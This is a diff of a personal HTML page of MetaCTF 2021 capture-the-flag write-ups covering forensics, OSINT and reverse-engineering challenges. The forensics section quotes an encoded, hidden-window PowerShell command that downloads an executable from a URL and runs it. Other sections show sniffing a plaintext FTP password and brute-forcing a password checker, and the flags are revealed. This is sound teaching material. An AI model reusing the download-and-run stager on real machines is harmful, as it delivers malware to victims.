@@ -23,7 +23,7 @@
       <h1 style="margin-bottom:0px;">Writeup: MetaCTF CyberGames 2021</h1>
       <div class="nav">
         <p style="font-size:18px;margin-top:0px;margin-bottom:12px">2021-12-30 |&nbsp;</p>
-        <a href="" style="font-size:18px;font-weight:bold;">Writeups</a>
+        <a href="../writeups.html" style="font-size:18px;font-weight:bold;">Writeups</a>
       </div>
       <p>In early December of 2021 MetaCTF hosted their 7th annual CyberGames competition, lasting 48 hours. The competition saw over 3,100 participants, with challenges ranging in difficulty from beginner to expert.</p>
       <p>This list of writeups is not exhastive and only contains the challenges that I was able to solve and found interesting. I will hopefully update this over time as I solve more challenges.</p>
@@ -38,7 +38,7 @@
       </ul>
       
       <h2 id="BinEx" style="margin-bottom:0px;">Binary Exploitation</h2>
-      <div class="post">
+      <div class="post" style="font-weight:bold;">
         
       </div>
       <h2 id="Crypto" style="margin-bottom:0px;">Cryptography</h2>
@@ -64,19 +64,141 @@
         </details>
       </div>
       <h2 id="Forensics" style="margin-bottom:0px;">Forensics</h2>
-      <div class="post">
-
+      <div class="post" style="font-weight:bold;">
+        <center>
+          <h3>My Logs Know What You Did</h3>
+        </center>
+        <blockquote>
+          <p><em>While investigating an incident, you identify a suspicious powershell command that was run on a compromised system ... can you figure out what it was doing?</em></p>
+          <code><em>C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -noP -sta -w 1 -enc TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTWV0YUNURntzd<br>XBlcl9zdXNfc3Q0Z2luZ19zaXRlX2QwdF9jMG19L19iYWQuZXhlJywnYmFkLmV4ZScpO1N0YXJ0LVByb2Nlc3<br>MgJ2JhZC5leGUn</em></code>
+        </blockquote>
+        <p>This is an encoded powershell script that will run as a command when executed on a system. To find out what the code is doing we can decode the base64 data to recover the payload.</p>
+        <code>echo "TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTWV0YUNURntzdXBlcl9<br>zdXNfc3Q0Z2luZ19zaXRlX2QwdF9jMG19L19iYWQuZXhlJywnYmFkLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2JhZC5leGUn" | base64 -d</code>
+        <p>This returns the malicous code which contains the flag.</p>
+        <details style="margin-top:8px;">
+          <summary>Reveal Flag</summary>
+          <p style="margin-top:8px;">MetaCTF{super_sus_st4ging_site_d0t_c0m}</p>
+        </details>
+      </div>
+      <br>
+      <div class="post" style="font-weight:bold;">
+        <center>
+          <h3>Sharing Files and Passwords</h3>
+        </center>
+        <blockquote>
+          <p><em>FTP servers are made to share files, but if its communications are not encrypted, it might be sharing passwords as well. The password in this pcap to get the flag</em></p>
+        </blockquote>
+        <p>This challenge is simple enough to allow us to read through the packets rather than having to apply filters. However, to make our lives easier we can filter for only FTP packets.</p>
+        <p>With this filter we can see the conversation between the client and server in the info section of the packet summary. The fourth packet reveals the FTP server password in plain text.</p>
+        <details style="margin-top:8px;">
+          <summary>Reveal Flag</summary>
+          <p style="margin-top:8px;">MetaCTF{ftp_is_better_than_dropbox}</p>
+        </details>
       </div>
       <h2 id="Recon" style="margin-bottom:0px;">Reconnaissance</h2>
-      <div class="post">
-
+      <div class="post" style="font-weight:bold;">
+        <center>
+          <h3>Who Owns the Cloud?</h3>
+        </center>
+        <blockquote>
+          <p><em>In conducting Open Source Intelligence (OSINT), we act as sort of "cyber detectives," finding little tidbits of information and connecting them to put together a more complete understanding of something.</em></p>
+          <p><em>Take <a style="color:#641a1a;" href="https://www.google.com/maps/place/45261+W+Severn+Way,+Sterling,+VA+20166/@39.0208587,-77.4355928,3a,75y,138.17h,92.64t/data=!3m7!1e1!3m5!1sMo5GzJ87Z6d7CoBzwGvdcg!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fpanoid%3DMo5GzJ87Z6d7CoBzwGvdcg%26cb_client%3Dsearch.gws-prod.gps%26w%3D86%26h%3D86%26yaw%3D85.73731%26pitch%3D0%26thumbfov%3D100!7i16384!8i8192!4m5!3m4!1s0x89b6391acb68888f:0xa3256a6ad7d9dbcc!8m2!3d39.0208873!4d-77.4355454">this datacenter</a> for example. Usually it is very easy to figure out what company owns a building - especially when it's a giant facility and the company puts their logo on it. But what if the obvious visual clues aren't there? Dig deeper and see if you can find the company that *directly* owns this piece of land. You'll want to submit the name of the company as the flag.</em></p>
+        </blockquote>
+        <p>This challenge is interesting on many levels, but for starters, the address that is provided is not the correct address and we have the find the real address using street view. We find the correct address to be:</p>
+        <code>45295 W Severn Way, Sterling, VA 20166</code>
+        <p>The first result when searching google with this address is from datacenters.com revealing more information about the site.</p>
+        <code>https://www.datacenters.com/amazon-aws-aws-45259-sterling</code>
+        <blockquote>
+          <p><em>Amazon AWS AWS 45259 Sterling Data Center is located at 45259 West Severn Way, Sterling, VA, USA. The data center is 200000 sqft. The gross colocation space is not available for this data center. No power information has been offered for this location. We found 156 data center locations within 50 miles of this facility. No certifications are specified for this location.</em></p>
+        </blockquote>
+        <p>This reveals that this data center is owned by Amazon, but this is not the flag so there must be a subsidiary of Amazon that acually owns this property.</p>
+        <p>Searching google for "Amazon data center Sterling Virginia" revealed some interesting news articles about land aquisition to build data centers by Amazon. Several of the news articles refernce the company COPT or Corporate Office Properties Trust.</p>
+        <p>It is said in the articles that COPT is the real owner of the property which should be the correct flag.</p>
+        <details style="margin-top:8px;">
+          <summary>Reveal Flag</summary>
+          <p style="margin-top:8px;">COPT</p>
+        </details>
       </div>
       <h2 id="RE" style="margin-bottom:0px;">Reverse Engineering</h2>
-      <div class="post">
-
+      <div class="post" style="font-weight:bold;">
+        <center>
+          <h3>I Hate Python</h3>
+        </center>
+        <blockquote>
+          <p><em>I hate Python, and now you will too. Find the password.</em></p>
+            <code>
+              import random<br>
+              <br>
+              def do_thing(a, b):<br>
+                return ((a << 1) & b) ^ ((a << 1) | b)<br>
+              <br>
+              x = input("What's the password? ")<br>
+              <br>
+              if len(x) != 25:<br>
+                print("WRONG!!!!!")<br>
+              else:<br>
+                random.seed(997)<br>
+                k = [random.randint(0, 256) for _ in range(len(x))]<br>
+                a = { b: do_thing(ord(c), d) for (b, c), d in zip(enumerate(x), k) }<br>
+                b = list(range(len(x)))<br>
+                random.shuffle(b)<br>
+                c = [a[i] for i in b[::-1]]<br>
+                print(k)<br>
+                print(c)<br>
+                kn = [47, 123, 113, 232, 118, 98, 183, 183, 77, 64, 218, 223, 232, 82, 16, 72, 68, 191, 54, 116, 38, 151, 174, 234, 127]<br>
+                valid = len(list(filter(lambda s: kn[s[0]] == s[1], enumerate(c))))<br>
+                if valid == len(x):<br>
+                  print("Password is correct! Flag:", x)<br>
+                else:<br>
+                  print("WRONG!!!!!!")
+            </code>
+        </blockquote>
+        <p>At first glance this script looks like crap and might just make you hate python, but upon further inspection it is not bad at all.</p>
+        <p>Near the end of the script there is a comparison checking if valid is equal to the length of the password. This comparison led me to believe that each correct character in the password will add one to valid. By adding a print statement to check the value of valid and sending the program the password MetaCTFAAAAAAAAAAAAAAAAAA I was able to see that my hunch was correct.</p>
+        <p>Now I can modify the script to brute force each character in the password to find the right password.</p>
+        <blockquote>
+          <code>
+            import random<br>
+            from os import system<br>
+            from time import sleep<br>
+            <br>
+            def do_thing(a, b):<br>
+                return ((a << 1) & b) ^ ((a << 1) | b)<br>
+                <br>
+            def python_sucks(passwd, current_length):<br>
+                random.seed(997)<br>
+                k = [random.randint(0, 256) for _ in range(len(passwd))]<br>
+                a = { b: do_thing(ord(c), d) for (b, c), d in zip(enumerate(passwd), k) }<br>
+                b = list(range(len(passwd)))<br>
+                random.shuffle(b)<br>
+                c = [a[i] for i in b[::-1]]<br>
+                kn = [47, 123, 113, 232, 118, 98, 183, 183, 77, 64, 218, 223, 232, 82, 16, 72, 68, 191, 54, 116, 38, 151, 174, 234, 127]<br>
+                valid = len(list(filter(lambda s: kn[s[0]] == s[1], enumerate(c))))<br>
+                if valid > current_length:<br>
+                    return True<br>
+                else:<br>
+                    return False<br>
+                    <br>
+            currFlag = ''<br>
+            <br>
+            for i in range(25):<br>
+                for j in range(33, 128):<br>
+                    nextFlag = currFlag + chr(j) + 'A'*(24-i)<br>
+                    assert(len(nextFlag) == 25)<br>
+                    if python_sucks(nextFlag, len(currFlag)):<br>
+                        currFlag = currFlag + chr(j)<br>
+                        print(currFlag)<br>
+                        break<br>
+          </code>
+        </blockquote>
+        <p>Running this script successfully brute forced the password giving us our flag.</p>
+        <details style="margin-top:8px;">
+          <summary>Reveal Flag</summary>
+          <p style="margin-top:8px;">MetaCTF{yOu_w!N_th1$_0n3}</p>
+        </details>
       </div>
       <h2 id="WebEx" style="margin-bottom:0px;">Web Exploitation</h2>
-      <div class="post">
+      <div class="post" style="font-weight:bold;">
 
       </div>
       <h2 id="Other" style="margin-bottom:0px;">Other</h2>
